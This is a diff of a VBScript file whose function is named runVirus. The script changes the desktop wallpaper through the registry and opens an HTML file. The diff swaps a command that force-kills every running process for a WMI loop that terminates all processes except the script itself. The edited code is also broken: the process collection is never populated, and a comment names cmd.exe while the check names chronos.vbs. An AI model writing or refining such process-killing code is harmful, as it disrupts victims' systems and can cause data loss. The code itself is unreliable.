@@ -2,6 +2,11 @@ Option Explicit
 
 Dim wallpaperPath, htmlFilePath, Shell, answer
 
+
+Dim objWMIService, colProcesses, objProcess
+
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+
 Dim scriptDir
 scriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
 
@@ -22,7 +27,13 @@ Function runVirus()
     Shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaperPath
     Shell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
 
-    Shell.Run "taskkill /f /im *"
+    For Each objProcess in colProcesses
+    ' Check if the process name is not "cmd.exe"
+    If Not LCase(objProcess.Name) = "chronos.vbs" Then
+        objProcess.Terminate
+    End If
+Next
+
     
     Shell.Run """" & htmlFilePath & """", 1, False
     
